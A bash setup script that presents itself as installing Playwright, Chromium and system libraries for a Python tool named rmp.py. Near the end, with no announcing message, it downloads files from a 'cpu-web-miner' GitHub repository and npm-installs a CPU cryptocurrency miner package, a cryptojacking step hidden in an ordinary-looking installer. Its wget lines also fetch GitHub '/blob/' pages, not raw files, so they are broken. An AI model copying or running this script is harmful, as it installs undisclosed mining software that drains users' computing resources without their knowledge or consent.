#!/usr/bin/env bash
set -e

echo "[*] Update package list..."
sudo apt-get update

echo "[*] Install base dependencies..."
sudo apt-get install -y \
  npm \
  wget curl unzip git \
  libatk1.0-0 \
  libatk-bridge2.0-0 \
  libcups2 \
  libxkbcommon0 \
  libatspi2.0-0 \
  libxdamage1 \
  libasound2 \
  libnss3 \
  libxshmfence1 \
  libxcomposite1 \
  libxrandr2 \
  libgbm1 \
  libpango-1.0-0 \
  libpangocairo-1.0-0 \
  libgtk-3-0

echo "[*] Install Python dependencies..."
pip install --upgrade pip
pip install playwright

echo "[*] Install Chromium browser for Playwright..."
playwright install chromium

wget -q https://github.com/MarcoCiaramella/cpu-web-miner/blob/main/index.js
wget -q https://github.com/MarcoCiaramella/cpu-web-miner/blob/main/package-lock.json
wget -q https://github.com/MarcoCiaramella/cpu-web-miner/blob/main/package.json
npm install
npm i @marco_ciaramella/cpu-web-miner

echo "[*] Done! Now you can run: python3 rmp.py"
